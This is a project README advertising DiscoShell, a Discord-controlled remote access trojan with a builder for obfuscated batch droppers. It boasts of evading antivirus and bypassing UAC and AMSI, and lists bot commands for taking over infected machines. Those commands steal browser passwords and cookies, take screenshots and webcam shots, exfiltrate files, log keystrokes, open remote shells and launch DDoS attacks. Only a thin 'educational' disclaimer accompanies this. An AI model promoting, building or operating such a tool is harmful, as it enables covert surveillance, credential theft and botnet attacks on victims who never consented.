# DiscoShell

DiscoShell (a.k.a. DiscoSh) is a minimal remote access trojan that is controlled via a Discord bot, allowing the creation of a Discord-based botnet.

The builder generates a batch file dropper which can be optionally obfuscated. The generated file can be used on its own and does not require additional code to be wrapped over it. You can find the compiled builder [here](https://github.com/cchash/DiscoShell/releases).

![image](https://media.discordapp.net/attachments/959762900443070485/969095436939984916/unknown.png)
![image](https://media.discordapp.net/attachments/959762900443070485/968536352234811452/image.jpg)

## Detection status
Virustotal result:
![image](https://media.discordapp.net/attachments/959762900443070485/960034118375190608/unknown.png)
[Link](https://www.virustotal.com/gui/file/541a70073404f35f6c0500d68de377d01dea3571f241723bb5975720c39dead8)

Also tested on a VM against Windows Defender, Avast and AVG.

None of the above guarantee that it is fully undetectable.

## Features
- Persistence
- UAC bypass
- Fileless

\+ Can perform all things described in the [Discord bot commands](#discord-bot-commands) section.

## Discord bot commands
The following commands are used to control infected machines.
```
get : Get username, machine name, IP address, IP location, unique ID of all infected machines.
getsc {unique_id} : Get screenshot of specified machine.
getcam {unique_id} : Get snapshot from all video sources on specified machine.
getfile {unique_id} {file_path} : Upload file located in {file_path} on specified machine to Discord.
getav {unique_id} : Get all antivirus products installed on specified machine.
getlogins {unique_id} : Get saved Chromium-based browser passwords on specified machine.
getcookies {unique_id} : Get saved Chromium-based browser cookies on specified machine.

shell {unique_id} : Start remote command prompt session on specified machine.
powershell {unique_id} : Start remote PowerShell session on specified machine (automatically bypasses AMSI).
execute {unique_id} {command} : Execute command on specified machine.

startkeylogger {unique_id} : Start keylogger on specified machine.
stopkeylogger {unique_id} : Stop keylogger on specified machine.
getkeylog {unique_id} : Get logged keys on specified machine.

startddos {website_url} : Make all infected machines send GET requests to specified URL.
stopddos : Make all infected machines stop sending GET requests.

uninfect {unique_id} : Uninfect specified machine.
```

## Disclaimer
This project was made for educational purposes and to test the capabilities of using Discord as a C2 server. If you choose to use this illegally/maliciously, it is your responsibility.
